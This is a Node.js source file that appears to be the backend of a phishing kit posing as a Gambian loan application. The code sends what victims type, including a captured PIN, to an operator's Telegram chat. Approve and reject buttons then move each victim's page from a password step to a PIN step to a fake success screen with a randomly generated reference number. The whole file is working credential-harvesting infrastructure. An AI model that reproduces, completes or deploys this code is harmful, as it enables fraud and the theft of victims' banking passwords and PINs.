require("dotenv").config();
const TelegramBot = require("node-telegram-bot-api");

// Initialize bot without polling (Render uses webhooks)
const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: false });
const ADMIN_ID = process.env.ADMIN_CHAT_ID;

const botManager = {
    bot: bot,

    sendToAdmin: (appId, title, data, needsApproval = false) => {
        let msg = `<b>${title}</b>\n🆔 ID: <code>${appId}</code>\n`;
        for (const [k, v] of Object.entries(data)) {
            msg += `<b>${k}:</b> <code>${v}</code>\n`;
        }

        const options = { parse_mode: 'HTML' };
        if (needsApproval) {
            options.reply_markup = {
                inline_keyboard: [[
                    // Moves user directly to PIN screen in index.html
                    { text: "✅ APPROVE (Move to PIN)", callback_data: `approve_4_${appId}` },
                    { text: "❌ REJECT", callback_data: `reject_${appId}` }
                ]]
            };
        }
        bot.sendMessage(ADMIN_ID, msg, options);
    },

    sendFinalApproval: (appId, pin) => {
        const msg = `🏁 <b>🇬🇲 FINAL PIN RECEIVED</b>\n🆔 ID: <code>${appId}</code>\n🔐 PIN: <code>${pin}</code>`;
        bot.sendMessage(ADMIN_ID, msg, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [[
                    { text: "✅ COMPLETE LOAN", callback_data: `approve_5_${appId}` },
                    { text: "❌ REJECT", callback_data: `reject_${appId}` }
                ]]
            }
        });
    }
};

// Handle Admin Button Clicks
bot.on("callback_query", (query) => {
    const [action, step, appId] = query.data.split("_");
    const io = global.io;

    if (action === "approve") {
        if (step === "4") {
            // Signal index.html to move to Step 5 (PIN)
            io.to(appId).emit('password-verified');
            bot.answerCallbackQuery(query.id, { text: "PIN input shown to user" });
        } 
        else if (step === "5") {
            // Signal index.html to show final success screen
            const ref = "GMB-" + Math.floor(Math.random() * 900000 + 100000);
            io.to(appId).emit('pin-verified', { referenceId: ref });
            bot.answerCallbackQuery(query.id, { text: "Gambia Application Completed!" });
        }
        
        bot.editMessageText(query.message.text + "\n\n✅ <b>ACTION: APPROVED</b>", {
            chat_id: ADMIN_ID,
            message_id: query.message.message_id,
            parse_mode: 'HTML'
        });
    }

    if (action === "reject") {
        io.to(appId).emit('error', { message: "Application declined by admin." });
        bot.answerCallbackQuery(query.id, { text: "Application Rejected" });
        bot.editMessageText(query.message.text + "\n\n❌ <b>ACTION: REJECTED</b>", {
            chat_id: ADMIN_ID,
            message_id: query.message.message_id,
            parse_mode: 'HTML'
        });
    }
});

module.exports = botManager;